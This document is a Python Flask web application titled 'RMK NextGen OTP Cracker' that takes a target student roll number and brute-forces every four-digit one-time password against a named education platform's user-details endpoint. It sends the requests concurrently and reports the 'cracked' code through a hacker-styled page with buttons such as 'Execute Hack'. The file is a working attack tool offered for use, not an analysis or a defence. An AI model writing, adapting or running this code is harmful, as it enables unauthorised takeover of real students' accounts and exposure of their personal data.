from flask import Flask, request, render_template_string, jsonify
import asyncio
import aiohttp
import threading
from queue import Queue

app = Flask(__name__)

# Shared state
progress_data = {
    "percent": 0,
    "otp_found": None,
    "done": False,
    "simulate_fill": False
}

CONCURRENT_REQUESTS = 25

@app.route("/", methods=["GET"])
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route("/start", methods=["POST"])
def start():
    roll_number = request.form.get("roll_number")
    if not roll_number:
        return "Invalid Roll Number", 400

    # Reset state
    progress_data.update({
        "percent": 0,
        "otp_found": None,
        "done": False,
        "simulate_fill": False
    })

    thread = threading.Thread(target=lambda: run_otp_finder(roll_number))
    thread.start()
    return "", 204

@app.route("/progress")
def get_progress():
    return jsonify(progress_data)

def run_otp_finder(roll_number):
    url_template = f"https://dbchangesstudent.edwisely.com/auth/v5/getUserDetails?roll_number={roll_number}&otp={{}}"

    sno_queue = Queue()
    for i in range(10000):
        sno_queue.put(f"{i:04d}")

    shared = {
        "request_counter": 0,
        "match_counter": 0,
    }

    lock = threading.Lock()
    stop_event = threading.Event()

    async def fetch_url(session, url, semaphore):
        if stop_event.is_set():
            return

        otp = url[-4:]
        async with semaphore:
            try:
                async with session.get(url) as response:
                    text = await response.text()
                    length = len(text)

                    with lock:
                        shared["request_counter"] += 1
                        if shared["request_counter"] % 100 == 0 and progress_data["percent"] < 100:
                            progress_data["percent"] += 1

                        if length > 2000:
                            shared["match_counter"] += 1
                            if shared["match_counter"] == 2:
                                progress_data["otp_found"] = otp
                                progress_data["simulate_fill"] = True
                                stop_event.set()
            except:
                pass
            await asyncio.sleep(0.001)

    async def worker():
        semaphore = asyncio.Semaphore(CONCURRENT_REQUESTS)
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=100)) as session:
            tasks = []
            while not sno_queue.empty() and not stop_event.is_set():
                sno = sno_queue.get()
                url = url_template.format(sno)
                tasks.append(fetch_url(session, url, semaphore))
                if len(tasks) >= CONCURRENT_REQUESTS:
                    await asyncio.gather(*tasks)
                    tasks = []
            if tasks:
                await asyncio.gather(*tasks)

    def run_worker():
        asyncio.run(worker())

        # If we should simulate fill, smoothly animate percent to 100
        if progress_data["simulate_fill"]:
            while progress_data["percent"] < 100:
                progress_data["percent"] += 1
                asyncio.run(asyncio.sleep(0.04))  # slows the animation
        progress_data["done"] = True

    run_worker()

# HTML + JS Template
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>OTP Cracker</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Share Tech Mono', monospace;
            background: #000;
            color: #00ffcc;
            text-align: center;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
        }

        /* Clean cyberpunk background gradient */
        .cyber-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background: linear-gradient(135deg, #000, #0a0f14, #000);
            background-size: 400%;
            animation: gradientFlow 30s ease infinite;
        }

        @keyframes gradientFlow {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        /* Professional header with subtle neon glow */
        h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 4em;
            text-transform: uppercase;
            letter-spacing: 6px;
            margin-bottom: 40px;
            color: #00ffcc;
            text-shadow: 0 0 10px #00ffcc, 0 0 20px #ff00ff;
            position: relative;
            z-index: 10;
        }

        form {
            display: flex;
            gap: 20px;
            margin-bottom: 50px;
            position: relative;
            z-index: 10;
        }

        input[type="text"] {
            padding: 16px;
            font-size: 1.4em;
            font-family: 'Share Tech Mono', monospace;
            background: rgba(10, 10, 10, 0.95);
            border: 2px solid #00ffcc;
            border-radius: 8px;
            color: #00ffcc;
            width: 400px;
            transition: all 0.3s ease;
            box-shadow: 0 0 15px rgba(0, 255, 204, 0.6);
            position: relative;
            z-index: 10;
        }

        input[type="text"]:focus {
            outline: none;
            border-color: #ff00ff;
            box-shadow: 0 0 25px #ff00ff, 0 0 40px #ff00ff;
        }

        input[type="submit"] {
            padding: 16px 50px;
            font-size: 1.4em;
            font-family: 'Orbitron', sans-serif;
            background: linear-gradient(90deg, #00ffcc, #ff00ff);
            border: none;
            border-radius: 8px;
            color: #000;
            cursor: pointer;
            text-transform: uppercase;
            transition: all 0.3s ease;
            box-shadow: 0 0 20px #ff00ff, 0 0 30px #00ffcc;
            position: relative;
            z-index: 10;
        }

        input[type="submit"]:hover {
            box-shadow: 0 0 30px #ff00ff, 0 0 50px #00ffcc;
            background: linear-gradient(90deg, #ff00ff, #00ffcc);
        }

        .bar-bg {
            width: 75%;
            height: 50px;
            background: rgba(10, 10, 10, 0.95);
            border: 2px solid #00ffcc;
            border-radius: 10px;
            margin: 40px auto;
            overflow: hidden;
            position: relative;
            box-shadow: 0 0 20px #00ffcc, 0 0 30px #ff00ff;
            z-index: 10;
        }

        .bar-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00ffcc, #ff00ff);
            transition: width 0.5s ease-in-out;
            position: relative;
            overflow: hidden;
        }

        .bar-fill::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(
                45deg,
                transparent 0%,
                rgba(255, 255, 255, 0.2) 50%,
                transparent 100%
            );
            animation: scan 1.2s linear infinite;
        }

        @keyframes scan {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        .otp-result {
            font-size: 2em;
            font-family: 'Orbitron', sans-serif;
            margin-top: 30px;
            color: #ff00ff;
            text-shadow: 0 0 10px #ff00ff;
            position: relative;
            z-index: 10;
        }

        .terminal {
            position: fixed;
            bottom: 20px;
            left: 20px;
            color: #00ffcc;
            font-size: 1.1em;
            font-family: 'Share Tech Mono', monospace;
            opacity: 0.9;
            text-shadow: 0 0 8px #00ffcc;
            z-index: 10;
        }
    </style>
</head>
<body>
    <div class="cyber-bg"></div>
    <h1>RMK NextGen OTP Cracker</h1>
    <form id="otpForm">
        <input type="text" name="roll_number" placeholder="Target Roll Number" required>
        <input type="submit" value="Execute Hack">
    </form>

    <div class="bar-bg" style="display:none;" id="progressSection">
        <div class="bar-fill" id="barFill"></div>
    </div>

    <div class="otp-result" id="otpResult"></div>
    <div class="terminal">> Initializing decryption protocol...</div>

    <script>
        const form = document.getElementById("otpForm");
        const barFill = document.getElementById("barFill");
        const progressSection = document.getElementById("progressSection");
        const otpResult = document.getElementById("otpResult");
        const terminal = document.querySelector(".terminal");

        form.addEventListener("submit", async function(e) {
            e.preventDefault();
            otpResult.innerText = "";
            progressSection.style.display = "block";
            barFill.style.width = "0%";
            terminal.innerText = "> Scanning OTP sequences...";

            const formData = new FormData(form);
            await fetch("/start", {
                method: "POST",
                body: formData
            });

            let interval = setInterval(async () => {
                const res = await fetch("/progress");
                const data = await res.json();
                barFill.style.width = data.percent + "%";

                if (data.done) {
                    clearInterval(interval);
                    if (data.otp_found) {
                        otpResult.innerText = "✅ OTP Cracked: " + data.otp_found;
                        terminal.innerText = "> Hack successful. Access granted.";
                    } else {
                        otpResult.innerText = "❌ No OTP Found";
                        terminal.innerText = "> Vulnerability patched...";
                    }
                }
            }, 150);
        });
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)
